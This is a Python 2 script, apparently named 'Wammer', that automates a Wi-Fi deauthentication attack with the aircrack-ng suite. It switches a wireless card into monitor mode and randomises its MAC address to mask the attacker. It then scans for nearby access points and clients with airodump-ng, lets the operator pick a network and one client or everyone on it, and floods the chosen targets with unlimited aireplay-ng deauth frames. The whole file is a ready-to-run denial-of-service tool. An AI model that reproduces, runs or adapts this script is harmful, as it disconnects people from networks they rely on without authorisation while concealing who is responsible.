#!/usr/bin/python

import os
import time
import subprocess
import sys

interface = ""
try:
	interfaces = []
	monitor = ""


	
	output = subprocess.check_output(["airmon-ng"])
	lines = output.splitlines()
	inum = len(lines) - 3

	if (inum == 0):
		print("Cannot find interface!")
		sys.exit(0)

	for i in range (2,len(lines)-1):
		line = lines[i]
		line = line.split("\t")
		interfaces.append(line[1])

	print("Select your interface:")

	for i in range(0, len(interfaces)):
		print(interfaces[i]+" [" + str(i) + "]")

	print("")
	index = int(raw_input("Your choice: "))
	interface = interfaces[index]
	print("Selected interface: " + interface)

	os.system("airmon-ng check " + interface +" kill")

	if not "mon" in interface:
		print("Going into monitor mode...")
		os.system("airmon-ng start "+interface)
		interface = interface + "mon"

	print("")
	print("Interface in monitor mode: " + interface)

	print("Changing MAC address...")
	os.system("ifconfig " + interface + " down")
	os.system("macchanger -r " + interface)
	os.system("ifconfig " + interface + " up")
	print("")
	print("MAC address is changed!")

	os.system("rm log_Wammer*")

	command = "airodump-ng -a -w log_Wammer " + interface + " > /dev/null 2>&1 & echo $1"
	os.system(command)
	print("Scanning the network (WAIT !)...")
	time.sleep(120)
	os.system('pkill -f "airodump-ng -a -w log_Wammer '+ interface + '"')

	with open("log_Wammer-01.csv") as f:
		content = f.readlines()

	AP = ""
	target = 0
	client = ""
	ch = ""

	APs = []
	clients = []

	stopIndex = 0
	for line in range(2,len(content)-1):
		if(content[line] == '\r\n'):
			stopIndex = line
			break
		else:
			vrstica = content[line].split(', ')
			mac = vrstica[0]
			name = vrstica[len(vrstica)-2]
			APs.append(name + "  " + mac + " _PWR: " + vrstica[7].strip() + " _CH: " + vrstica[3].strip())

	stopIndex =  stopIndex+2

	for line in range(stopIndex, len(content)-1):
		if(content[line] == '\r\n'):
			break
		else:
			vrstica = content[line].split(',')
			client = vrstica[0]
			station = vrstica[5]
			clients.append(station+ "  "+client + " _PWR: " + vrstica[3].strip())

	print "Choose Access Point:"
	for i in range(0,len(APs)):
		print APs[i] + "  [" + str(i) +"]"

	print("")
	index = int(raw_input("Your choice: "))
	AP = APs[index].split("  ")[1].split(" ")[0]
	ch = APs[index].split(" ")
	ch = ch[len(ch)-1]
	print "Selected Access Point: " + AP


	print ""
	print "Select client to deauth:"
	print "Everybody [999]"
	for i in range(0, len(clients)):
		line = clients[i].split("  ")
		#print line
		if(line[0].strip() == AP):
			print line[1] + "  [" + str(i) +"]"

	print ""
	index = int(raw_input("Your choice: "))
	if(index == 999):
		target = 0
		client = "Everybody"
		print "Selected target: Everybody"
	else:
		target = 1
		client = clients[index].split("  ")[1].split(" ")[0]
		print "Selected target: "+client


	os.system("rm log_Wammer*")
	print ""
	print ""
	print "------------------------------------"
	print "Access point: " + AP
	print "Client: " + client
	print "Channel: " + ch
	print "------------------------------------"
	print "To interrupt press CTRL+C and then run 'airmon-ng stop " + interface +"' to disable monitor mode"
	print ""

	print "Do you agree? Type 'yes' or application will be terminated..."
	accept = raw_input(":")
	if(accept == "yes"):
		#procced
		os.system("airmon-ng start "+ interface + " " + ch)
		print ""
		print "Start sending de-auth..."
		cmd = ""
		if(target == 1):
			cmd = "aireplay-ng -0 0 -a " + AP + " -c " + client + " " + interface
		else:
			cmd = "aireplay-ng -0 0 -a " + AP + " " + interface

		os.system(cmd)
	else:
		os.system("airmon-ng stop "+interface)
		sys.exit(0)
except KeyboardInterrupt:
	print ""
	print ""
	os.system("airmon-ng stop "+interface)
	sys.exit()
